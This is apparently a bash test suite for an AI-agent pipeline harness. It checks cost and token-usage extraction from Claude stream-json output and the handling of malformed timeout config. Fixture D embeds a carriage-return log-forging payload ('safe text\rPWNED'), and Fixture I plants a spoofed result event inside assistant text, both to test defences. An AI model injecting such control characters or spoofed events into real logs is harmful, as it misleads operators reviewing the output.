{"type":"system","subtype":"init","session_id":"01234567","model":"claude-opus-4-7"}
{not json{
{"type":"assistant","message":{"content":[{"type":"text","text":"after garbage"}]}}
{"type":"result","total_cost_usd":0.5,"usage":{"input_tokens":1,"output_tokens":2,"cache_creation_input_tokens":3,"cache_read_input_tokens":4},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

keys_c="$(jq -r 'keys | sort | join(",")' "$USAGE_C" 2>/dev/null || printf '')"
cost_c="$(jq -r '.cost_usd' "$USAGE_C" 2>/dev/null || printf '')"
if [[ "$keys_c" == "$expected_keys" ]] && [[ "$cost_c" == "0.5" ]]; then
  pass_at "fixture-C malformed-line: garbage NDJSON line silently dropped; result still extracted"
else
  fail_at "fixture-C malformed-line" "keys=$keys_c cost=$cost_c"
fi

# ─── Fixture D: log-forge defense (SEC-010) ───────────────────────────────
# Embed a literal CR byte in agent text. The renderer's strip_ctrl jq
# function must replace C0 control chars with " " before they reach stdout.
USAGE_D="$ISSUE_DIR/usage-plan-D.json"
rm -f "$USAGE_D" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_D="$(
  _render_and_capture_stream "$USAGE_D" "$ISSUE_DIR" <<NDJSON
{"type":"system","subtype":"init","session_id":"cafebabecafebabe","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"safe text\rPWNED"}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)"

# `safe text\rPWNED` after C0-strip becomes `safe text PWNED`. Assert no
# raw CR byte made it to stdout.
if ! printf '%s' "$RENDER_OUT_D" | grep -q $'\r'; then
  pass_at "fixture-D log-forge: CR byte stripped from renderer stdout (SEC-010)"
else
  fail_at "fixture-D log-forge" "stdout still contains raw CR"
fi

# ─── Fixture E: dry-run stale-file removal (E-04 / D-006) ─────────────────
USAGE_E="$ISSUE_DIR/usage-planning-E.json"
printf '{"stale":true}' > "$USAGE_E"
[[ -s "$USAGE_E" ]] || die "fixture-E setup failed (could not seed stale file)"

PROMPT_FILE="$_TEST_STUB_DIR/dry-prompt.txt"
printf 'irrelevant\n' > "$PROMPT_FILE"

# Run dispatch.sh in dry-run mode against a stage that maps onto USAGE_E.
# dispatch.sh dies on an unknown stage's allowed_tools_for, so use a real
# stage and rename the seed file to match `usage-${stage}.json`.
mv "$USAGE_E" "$ISSUE_DIR/usage-planning.json"
USAGE_E="$ISSUE_DIR/usage-planning.json"
[[ -s "$USAGE_E" ]] || die "fixture-E rename failed"

PIPELINE_DRY_RUN=1 \
PIPELINE_ISSUE_ID="ENG-T-COST" \
HARNESS_STATE_DIR="$HARNESS_STATE_DIR" \
PROJECT_STATE_DIR="$PROJECT_STATE_DIR" \
PROJECT_SLUG="$PROJECT_SLUG" \
TARGET_REPO="$TARGET_REPO" \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" planning "$PROMPT_FILE" >/dev/null 2>&1 || true

if [[ ! -e "$USAGE_E" ]]; then
  pass_at "fixture-E dry-run: pre-existing usage-planning.json removed at dispatch entry"
else
  fail_at "fixture-E dry-run" "stale file still present: $(cat "$USAGE_E")"
fi

# ─── QA-authored adversarial fixtures (NOT in plan's Failure Mode → Test Map) ─

# ─── Fixture F: multiple result events — last wins ─────────────────────────
# A reconnect or partial-write scenario can theoretically emit two top-level
# result events (e.g. claude restarts a subagent run). The renderer's
# `grep | tail -1` contract MUST select the LAST result event, not the
# first. Pin the behavior so a future refactor (e.g. switching to `head -1`
# or to a streaming jq filter that keeps the first match) fails this test.
USAGE_F="$ISSUE_DIR/usage-plan-F.json"
rm -f "$USAGE_F" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_F" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"00000001","model":"claude-opus-4-7"}
{"type":"result","total_cost_usd":0.10,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"first-model":{}}}
{"type":"result","total_cost_usd":0.99,"usage":{"input_tokens":2,"output_tokens":2,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"second-model":{}}}
NDJSON

cost_f="$(jq -r '.cost_usd' "$USAGE_F" 2>/dev/null || printf '')"
model_f="$(jq -r '.model' "$USAGE_F" 2>/dev/null || printf '')"
if [[ "$cost_f" == "0.99" && "$model_f" == "second-model" ]]; then
  pass_at "fixture-F multiple result events: last wins (cost=0.99, model=second-model)"
else
  fail_at "fixture-F multiple result events" "cost=$cost_f model=$model_f"
fi

# ─── Fixture G: result event missing the `usage` block ─────────────────────
# A degraded result event (e.g. a CLI version that drops the usage rollup
# under failure) MUST still produce a six-field file with `// 0` defaults
# rather than crash. cost_usd and model survive even when usage is gone.
USAGE_G="$ISSUE_DIR/usage-plan-G.json"
rm -f "$USAGE_G" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_G" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"00000002","model":"claude-opus-4-7"}
{"type":"result","total_cost_usd":2.50,"modelUsage":{"degraded-model":{}}}
NDJSON

keys_g="$(jq -r 'keys | sort | join(",")' "$USAGE_G" 2>/dev/null || printf '')"
ti_g="$(jq -r '.tokens_in' "$USAGE_G" 2>/dev/null || printf '')"
# Numeric-equal compare (jq preserves the input's textual form: 2.50 stays 2.50,
# 2.5 stays 2.5 — both are numerically equal to 2.5).
co_eq_g="$(jq -r '.cost_usd == 2.5' "$USAGE_G" 2>/dev/null || printf 'false')"
mo_g="$(jq -r '.model' "$USAGE_G" 2>/dev/null || printf '')"
if [[ "$keys_g" == "$expected_keys" ]] \
   && [[ "$ti_g" == "0" ]] \
   && [[ "$co_eq_g" == "true" ]] \
   && [[ "$mo_g" == "degraded-model" ]]; then
  pass_at "fixture-G missing usage: six-field file written with token=0 defaults; cost+model survive"
else
  fail_at "fixture-G missing usage" "keys=$keys_g tokens_in=$ti_g cost_eq_2.5=$co_eq_g model=$mo_g"
fi

# ─── Fixture H: empty stdin (claude died before emitting anything) ─────────
# The renderer reads zero bytes; tee writes nothing; jq's `inputs` consumes
# nothing; grep finds no result event. Soft-fail: no usage file written.
USAGE_H="$ISSUE_DIR/usage-plan-H.json"
rm -f "$USAGE_H" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_H="$(_render_and_capture_stream "$USAGE_H" "$ISSUE_DIR" </dev/null 2>&1)"
if [[ ! -e "$USAGE_H" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_H"; then
  pass_at "fixture-H empty stdin: usage file not written; soft-fail warning logged"
else
  fail_at "fixture-H empty stdin" "exists=$([[ -e $USAGE_H ]] && echo y || echo n) out=$RENDER_OUT_H"
fi

# ─── Fixture I: type:"result" substring inside assistant text (FALSE POSITIVE) ─
# An agent debugging this very feature could legitimately emit the literal text
# `{"type":"result","total_cost_usd":99999}` inside an assistant text payload
# (e.g. transcribing a stream-json sample for the user). The renderer's
# extraction is `grep '"type":"result"' raw_capture | tail -1` — a naive
# substring grep that matches anywhere on the line, including inside JSON-
# encoded `text` fields. The current renderer's tee writes one NDJSON event
# per line, so an inline `type":"result"` substring DOES appear on the
# assistant event's line, and `tail -1` would pick the LAST line — which is
# the real result event. Confirm the real cost is extracted (0.42), NOT the
# fake $99999 from the assistant's debug transcript. A future refactor that
# changes the extraction to "first match" or to a JSON-path filter that
# crawls .text fields would silently leak the fake value.
USAGE_I="$ISSUE_DIR/usage-plan-I.json"
rm -f "$USAGE_I" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_I" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"Here is a fake stream-json sample I am debugging: {\"type\":\"result\",\"total_cost_usd\":99999,\"usage\":{\"input_tokens\":1,\"output_tokens\":1,\"cache_creation_input_tokens\":0,\"cache_read_input_tokens\":0},\"modelUsage\":{\"fake-model\":{}}}"}]}}
{"type":"result","total_cost_usd":0.42,"usage":{"input_tokens":5,"output_tokens":6,"cache_creation_input_tokens":17,"cache_read_input_tokens":20},"modelUsage":{"real-model":{}}}
NDJSON
cost_i="$(jq -r '.cost_usd' "$USAGE_I" 2>/dev/null || printf '')"
model_i="$(jq -r '.model' "$USAGE_I" 2>/dev/null || printf '')"
if [[ "$cost_i" == "0.42" ]] && [[ "$model_i" == "real-model" ]]; then
  pass_at "fixture-I substring false-positive: real result wins over inline 'type:\"result\"' in assistant text"
else
  fail_at "fixture-I substring false-positive" "cost=$cost_i (expected 0.42) model=$model_i (expected real-model)"
fi

# ─── Fixture J: zero-byte usage file race window (post-truncate, pre-write) ──
# A theoretical race: dispatch.sh's renderer truncates `>` the file but
# crashes before jq writes the body. A subsequent reader (`_cost_flags_for`
# or `_cost_footer`) MUST treat a zero-byte usage file the same as missing
# (soft-fail D-010), not as a parse error that bubbles up to the operator.
# Pin the renderer's behavior on a pre-existing zero-byte file: it should
# overwrite cleanly when a new stream arrives.
USAGE_J="$ISSUE_DIR/usage-plan-J.json"
rm -f "$USAGE_J" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
: > "$USAGE_J"  # zero-byte seed file
_render_and_capture_stream "$USAGE_J" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"00000003","model":"claude-opus-4-7"}
{"type":"result","total_cost_usd":0.55,"usage":{"input_tokens":3,"output_tokens":4,"cache_creation_input_tokens":1,"cache_read_input_tokens":1},"modelUsage":{"recovered-model":{}}}
NDJSON
keys_j="$(jq -r 'keys | sort | join(",")' "$USAGE_J" 2>/dev/null || printf '')"
cost_j="$(jq -r '.cost_usd' "$USAGE_J" 2>/dev/null || printf '')"
if [[ "$keys_j" == "$expected_keys" ]] && [[ "$cost_j" == "0.55" ]]; then
  pass_at "fixture-J zero-byte seed: renderer overwrites cleanly with six-field payload"
else
  fail_at "fixture-J zero-byte seed" "keys=$keys_j cost=$cost_j"
fi

# ─── Fixture K: unknown future field in result event (forward-compat) ─────
# A future claude release may add fields like `thinking_tokens`, `priority`,
# or `request_id` to the result event. The renderer's six-field allowlist
# extraction (.usage.input_tokens, etc.) MUST silently ignore unknown top-
# level fields and unknown nested usage fields — never panic, never leak.
USAGE_K="$ISSUE_DIR/usage-plan-K.json"
rm -f "$USAGE_K" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_K" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"result","total_cost_usd":0.07,"usage":{"input_tokens":2,"output_tokens":3,"cache_creation_input_tokens":4,"cache_read_input_tokens":5,"thinking_tokens":999,"future_nested_field":"x"},"modelUsage":{"future-model":{}},"request_id":"req_abc","priority":"high","new_top_level_field":[1,2,3]}
NDJSON
keys_k="$(jq -r 'keys | sort | join(",")' "$USAGE_K" 2>/dev/null || printf '')"
has_request_id_k="$(jq -r 'has("request_id")' "$USAGE_K" 2>/dev/null || printf 'true')"
has_thinking_k="$(jq -r 'has("thinking_tokens")' "$USAGE_K" 2>/dev/null || printf 'true')"
if [[ "$keys_k" == "$expected_keys" ]] \
   && [[ "$has_request_id_k" == "false" ]] \
   && [[ "$has_thinking_k" == "false" ]]; then
  pass_at "fixture-K forward-compat: unknown future fields ignored; six-field allowlist enforced"
else
  fail_at "fixture-K forward-compat" "keys=$keys_k request_id=$has_request_id_k thinking=$has_thinking_k"
fi

# ─── Fixture L: ENG-65 partial-usage capture on SIGTERM (no result event) ─
# A wall-clock SIGTERM mid-stream loses the aggregated `result` event.
# D-003: sum per-message assistant.message.usage.* across the captured
# NDJSON, mark the file as `partial: true` with `cost_usd: null`. The
# downstream `_cost_flags_for // 0` coerces null → 0 — verified separately
# in run-stage-test (case-23). The `partial` flag on disk is the
# discriminator that distinguishes "captured under SIGTERM" from "clean
# zero-cost dispatch" for the retrospective.
USAGE_L="$ISSUE_DIR/usage-plan-L.json"
rm -f "$USAGE_L" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_L" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef-l","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":20,"cache_creation_input_tokens":10}}}
{"type":"assistant","message":{"id":"msg_02","content":[{"type":"text","text":"more"}],"usage":{"input_tokens":200,"output_tokens":80,"cache_read_input_tokens":30,"cache_creation_input_tokens":15}}}
{"type":"assistant","message":{"id":"msg_03","content":[{"type":"text","text":"yet more"}],"usage":{"input_tokens":50,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":3}}}
NDJSON

if [[ ! -s "$USAGE_L" ]]; then
  fail_at "fixture-L partial usage" "usage file missing or empty: $USAGE_L"
else
  partial_l="$(jq -r '.partial' "$USAGE_L" 2>/dev/null || printf '')"
  cost_l_null="$(jq -r '.cost_usd == null' "$USAGE_L" 2>/dev/null || printf 'false')"
  ti_l="$(jq -r '.tokens_in' "$USAGE_L" 2>/dev/null || printf '')"
  to_l="$(jq -r '.tokens_out' "$USAGE_L" 2>/dev/null || printf '')"
  cr_l="$(jq -r '.cache_read' "$USAGE_L" 2>/dev/null || printf '')"
  cc_l="$(jq -r '.cache_create' "$USAGE_L" 2>/dev/null || printf '')"
  model_l="$(jq -r '.model' "$USAGE_L" 2>/dev/null || printf '')"
  if [[ "$partial_l" == "true" ]] \
     && [[ "$cost_l_null" == "true" ]] \
     && [[ "$ti_l" == "350"  ]] \
     && [[ "$to_l" == "150"  ]] \
     && [[ "$cr_l" == "55"   ]] \
     && [[ "$cc_l" == "28"   ]] \
     && [[ "$model_l" == "claude-opus-4-7" ]]; then
    pass_at "fixture-L partial usage: tokens summed across assistant events; partial=true, cost_usd=null, model from init"
  else
    fail_at "fixture-L partial usage" \
      "partial=$partial_l cost_null=$cost_l_null tokens_in=$ti_l tokens_out=$to_l cache_read=$cr_l cache_create=$cc_l model=$model_l"
  fi
fi

# ─── Fixture L extension: malformed/missing usage block on assistant event ─
# A degraded assistant event lacks the `message.usage` key entirely. The
# `(.message.usage // {})` guard absorbs the missing event as 0, so the
# sum equals only the valid events' total. Mirrors the F2/D-002 tolerance:
# one bad event must not crash the partial-extraction filter.
USAGE_L2="$ISSUE_DIR/usage-plan-L2.json"
rm -f "$USAGE_L2" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_L2" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef-l2","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":20,"cache_creation_input_tokens":10}}}
{"type":"assistant","message":{"id":"msg_02","content":[{"type":"text","text":"missing usage block"}]}}
{"type":"assistant","message":{"id":"msg_03","content":[{"type":"text","text":"more"}],"usage":{"input_tokens":50,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":3}}}
NDJSON

if [[ ! -s "$USAGE_L2" ]]; then
  fail_at "fixture-L2 malformed usage" "usage file missing or empty: $USAGE_L2"
else
  partial_l2="$(jq -r '.partial' "$USAGE_L2" 2>/dev/null || printf '')"
  ti_l2="$(jq -r '.tokens_in' "$USAGE_L2" 2>/dev/null || printf '')"
  to_l2="$(jq -r '.tokens_out' "$USAGE_L2" 2>/dev/null || printf '')"
  if [[ "$partial_l2" == "true" ]] \
     && [[ "$ti_l2" == "150" ]] \
     && [[ "$to_l2" == "70"  ]]; then
    pass_at "fixture-L2 malformed usage: missing message.usage absorbed as 0; valid events still summed"
  else
    fail_at "fixture-L2 malformed usage" "partial=$partial_l2 tokens_in=$ti_l2 (expected 150) tokens_out=$to_l2 (expected 70)"
  fi
fi

# Existing Fixture H regression — empty stdin must still soft-fail under
# the new partial path because the `_partial_sum > 0` guard rejects a
# zero-token sum. Verify (a) no usage file is written and (b) the soft-fail
# log line still fires. This is the same assertion as Fixture H above; we
# pin it again here so a future refactor of the partial-extraction filter
# can't accidentally start writing a partial file with all-zeros.
USAGE_HE="$ISSUE_DIR/usage-plan-HE.json"
rm -f "$USAGE_HE" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_HE="$(_render_and_capture_stream "$USAGE_HE" "$ISSUE_DIR" </dev/null 2>&1)"
if [[ ! -e "$USAGE_HE" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_HE"; then
  pass_at "ENG-65 fixture-H regression pin: empty stdin → no partial file written (zero-token guard)"
else
  fail_at "ENG-65 fixture-H regression" "exists=$([[ -e $USAGE_HE ]] && echo y || echo n) out=$RENDER_OUT_HE"
fi

# ─── ENG-65 QA adversarial coverage ───────────────────────────────────────
# These four fixtures cover gaps surfaced by the QA cold-pass:
#   QA1 — negative integer per-stage override pinned at "fall through"
#         (the regex `^[0-9]+$` excludes `-` so the negative is rejected
#         and the built-in default applies; pins the contract so a future
#         "be more permissive" regex change can't accidentally pass `-5`
#         to gtimeout, which would error opaquely at invocation time).
#   QA2 — float / decimal per-stage override is rejected by the regex.
#         A naive `60.5` (operator copies a derived average) must not
#         silently apply (bash arithmetic would truncate or error).
#   QA3 — partial-usage filter when `assistant.message.usage` is a
#         non-object (array) — type confusion from a buggy upstream.
#         Currently `(.input_tokens // 0)` on `[]` makes the jq
#         invocation fail, dropping the partial file silently. Pin the
#         observable behavior (no file written, soft-fail log emitted)
#         so a future refactor can't quietly start writing a corrupt
#         partial file.
#   QA4 — partial-usage filter with multiple `system`/`init` events,
#         only the second carrying a `.model`. The filter takes the
#         FIRST init's model via `[0].model // ""`, so the resulting
#         file's `model` field is empty even though a model is present
#         later in the stream. Document this as expected-but-degraded
#         behavior (operator can still see the partial token sums and
#         the `partial: true` discriminator).

# QA1 — negative integer per-stage override
TARGET_REPO_NEG="$_TEST_STUB_DIR/target-negative"
mkdir -p "$TARGET_REPO_NEG/.pipeline-config/schemas"
jq -n '{
  project: { slug: "neg-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: -5 } }
}' > "$TARGET_REPO_NEG/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_NEG/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_NEG="$_TEST_STUB_DIR/dryrun-negative.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_NEG" "neg-slug" brainstorming "$DRYRUN_OUT_NEG"
# Assert the resolved seconds is the 60-min default (3600), and that no
# negative seconds value (e.g. ` -300 `) leaked into the gtimeout invocation.
if grep -qE 'gtimeout.*[[:space:]]3600[[:space:]]' "$DRYRUN_OUT_NEG" \
   && ! grep -qE 'gtimeout.*[[:space:]]-[0-9]+[[:space:]]' "$DRYRUN_OUT_NEG"; then
  pass_at "ENG-65 QA1 (adversarial): negative integer per-stage=-5 rejected by regex; falls through to 60-min built-in (3600s)"
else
  fail_at "ENG-65 QA1: negative integer per-stage override leaked through" \
    "log: $(cat "$DRYRUN_OUT_NEG")"
fi

# QA2 — float / decimal per-stage override
TARGET_REPO_FLOAT="$_TEST_STUB_DIR/target-float"
mkdir -p "$TARGET_REPO_FLOAT/.pipeline-config/schemas"
jq -n '{
  project: { slug: "float-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: 60.5 } }
}' > "$TARGET_REPO_FLOAT/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_FLOAT/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_FLOAT="$_TEST_STUB_DIR/dryrun-float.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_FLOAT" "float-slug" brainstorming "$DRYRUN_OUT_FLOAT"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_FLOAT"; then
  pass_at "ENG-65 QA2 (adversarial): float per-stage=60.5 rejected by regex; falls through to 60-min built-in (3600s)"
else
  fail_at "ENG-65 QA2: float per-stage override leaked through" \
    "log: $(cat "$DRYRUN_OUT_FLOAT")"
fi

# QA3 — `assistant.message.usage` is an array (type confusion)
USAGE_QA3="$ISSUE_DIR/usage-plan-QA3.json"
rm -f "$USAGE_QA3" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
NDJSON_QA3="$_TEST_STUB_DIR/qa3.ndjson"
cat > "$NDJSON_QA3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"qa3","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":[100,50,20,10]}}
NDJSON
RENDER_OUT_QA3="$(_render_and_capture_stream "$USAGE_QA3" "$ISSUE_DIR" < "$NDJSON_QA3" 2>&1)"
if [[ ! -e "$USAGE_QA3" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_QA3"; then
  pass_at "ENG-65 QA3 (adversarial): array-shaped message.usage → jq fails gracefully → no partial file written (soft-fail log emitted)"
else
  fail_at "ENG-65 QA3: array usage value silently produced a partial file" \
    "exists=$([[ -e "$USAGE_QA3" ]] && echo y || echo n) out=$RENDER_OUT_QA3"
fi

# QA4 — multiple system/init events; only second carries .model
USAGE_QA4="$ISSUE_DIR/usage-plan-QA4.json"
rm -f "$USAGE_QA4" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_QA4" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"qa4-first"}
{"type":"system","subtype":"init","session_id":"qa4-second","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":20,"cache_creation_input_tokens":10}}}
NDJSON

if [[ ! -s "$USAGE_QA4" ]]; then
  fail_at "ENG-65 QA4: usage file missing despite valid assistant event" "path=$USAGE_QA4"
else
  partial_qa4="$(jq -r '.partial' "$USAGE_QA4" 2>/dev/null || printf '')"
  ti_qa4="$(jq -r '.tokens_in' "$USAGE_QA4" 2>/dev/null || printf '')"
  model_qa4="$(jq -r '.model' "$USAGE_QA4" 2>/dev/null || printf '')"
  # Filter takes [0].model — first init lacks .model so // "" yields "".
  # Pin this as expected-but-degraded; the partial token sum is still
  # correct and `partial: true` is the load-bearing discriminator.
  if [[ "$partial_qa4" == "true" ]] \
     && [[ "$ti_qa4" == "100" ]] \
     && [[ "$model_qa4" == "" ]]; then
    pass_at "ENG-65 QA4 (adversarial): multi-init stream — first init wins for .model (empty when absent), tokens still summed correctly"
  else
    fail_at "ENG-65 QA4: multi-init partial-usage extraction" \
      "partial=$partial_qa4 tokens_in=$ti_qa4 model=$model_qa4"
  fi
fi

# QA5 — precedence-chain short-circuit pin (operator-trap documentation).
# When the per-stage value is *present-but-malformed* AND the global is
# valid, the implementation does NOT fall through to the global — the
# global lookup only fires when per-stage is empty. Both reads share the
# same `_cfg_minutes` slot, so a non-empty malformed value (passes the
# `[[ -z "$_cfg_minutes" ]]` guard, fails the regex) shorts the chain to
# the built-in default and silently bypasses the operator's global cap
# for the affected stage.
#
# This pins the *actual* behavior so a future refactor doesn't change it
# accidentally. CLAUDE.md's "fall through to the next layer" prose is
# slightly imprecise re: this case; the plan's pseudocode (the contract)
# is what the implementation follows. Doc clarification is a follow-up.
# Operators who hit this surprise can grep the per-stage transcript for
# the resolved `gtimeout ... <seconds>` to confirm which layer won.
TARGET_REPO_PREC="$_TEST_STUB_DIR/target-precedence"
mkdir -p "$TARGET_REPO_PREC/.pipeline-config/schemas"
jq -n '{
  project: { slug: "prec-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes: 5, dispatch_timeout_minutes_per_stage: { brainstorming: "60m" } }
}' > "$TARGET_REPO_PREC/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_PREC/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_PREC="$_TEST_STUB_DIR/dryrun-precedence.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_PREC" "prec-slug" brainstorming "$DRYRUN_OUT_PREC"
# Actual behavior: malformed per-stage shorts the chain → built-in 60-min
# (3600s) wins, NOT the operator's 5-min global. Pin the surprise so a
# future change either fixes it (and breaks this test, prompting a doc
# update) or knowingly preserves it.
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_PREC" \
   && ! grep -qE 'gtimeout.*\b300\b' "$DRYRUN_OUT_PREC"; then
  pass_at "ENG-65 QA5 (adversarial): malformed per-stage shorts the precedence chain to built-in (3600s) — pins the operator-trap that bypasses the global override"
else
  fail_at "ENG-65 QA5: precedence-chain pin (expected built-in 3600s; got something else)" \
    "log: $(cat "$DRYRUN_OUT_PREC")"
fi

# QA6 — prompt-side D-001 contract pin. AGENT_PROMPTS.md §1 step 3 must
# carry the `iteration-exhausted` halt instruction and must NOT carry the
# old "Iterate at most 3 times" / `brainstorm_escalate` language.
# render-prompt.sh validates fence count, not content; without this grep,
# a future agent could silently revert D-001 and the harness would
# happily re-dispatch unbounded persona-review iterations. The prompt is
# load-bearing for ENG-65 — pin it.
ENG_65_PROMPTS_PATH="$SCRIPT_DIR/../AGENT_PROMPTS.md"
[[ -f "$ENG_65_PROMPTS_PATH" ]] || ENG_65_PROMPTS_PATH="$HARNESS_ROOT/AGENT_PROMPTS.md"
if [[ ! -f "$ENG_65_PROMPTS_PATH" ]]; then
  fail_at "ENG-65 QA6 prompt-contract" "AGENT_PROMPTS.md not found at $ENG_65_PROMPTS_PATH"
else
  # Extract §1 (Brainstorm Agent) — bounded by `## 1.` heading and the next
  # `## ` heading. Then assert the four substring conditions.
  brainstorm_section="$(awk '/^## 1\./{ in_b=1 } in_b{print} /^## 2\./{ if (in_b) exit }' "$ENG_65_PROMPTS_PATH")"
  qa6_ok=1
  qa6_msg=""
  if ! grep -qF 'iteration-exhausted' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="missing iteration-exhausted; "
  fi
  if ! grep -qF 'Do NOT start iteration 3' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="missing 'Do NOT start iteration 3'; "
  fi
  if grep -qF 'Iterate at most 3 times' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="legacy 'Iterate at most 3 times' still present; "
  fi
  if grep -qF 'brainstorm_escalate' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="dead brainstorm_escalate marker still present; "
  fi
  if (( qa6_ok == 1 )); then
    pass_at "ENG-65 QA6 (adversarial): AGENT_PROMPTS §1 carries iteration-exhausted + 'Do NOT start iteration 3'; legacy 'Iterate at most 3 times' / brainstorm_escalate removed"
  else
    fail_at "ENG-65 QA6 prompt-contract drift" "$qa6_msg"
  fi
fi

# QA7 — `dispatch_timeout_minutes_per_stage` is a non-object (array shape).
# Surfaced by the round-3 cold-pass: jq's `<arr>[$s]` indexing errors with
# "Cannot index array with string"; the `2>/dev/null || true` swallows the
# error stream, the per-stage read returns empty, and the resolver falls
# through to the global lookup (then to the built-in default). This is a
# different code path from QA5 (parent-key TYPE confusion vs. value-shape
# malformed) but it lands at the same observable: built-in default wins,
# no operator-visible warning.
#
# Pin the graceful-fallthrough so a future "tighten jq's type guard"
# refactor either preserves silent fallthrough (test stays green) or
# adds an explicit reject + log (test breaks, prompting a doc update).
TARGET_REPO_ARR="$_TEST_STUB_DIR/target-arrshape"
mkdir -p "$TARGET_REPO_ARR/.pipeline-config/schemas"
jq -n '{
  project: { slug: "arr-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: ["brainstorming", 60] }
}' > "$TARGET_REPO_ARR/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_ARR/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_ARR="$_TEST_STUB_DIR/dryrun-arrshape.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_ARR" "arr-slug" brainstorming "$DRYRUN_OUT_ARR"
# No global override either, so built-in default 60-min (3600s) must win.
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_ARR"; then
  pass_at "ENG-65 QA7 (adversarial): dispatch_timeout_minutes_per_stage as array (parent-key type confusion) → jq error swallowed → built-in default 3600s wins"
else
  fail_at "ENG-65 QA7: array-shaped parent key did not fall through cleanly" \
    "log: $(cat "$DRYRUN_OUT_ARR")"
fi

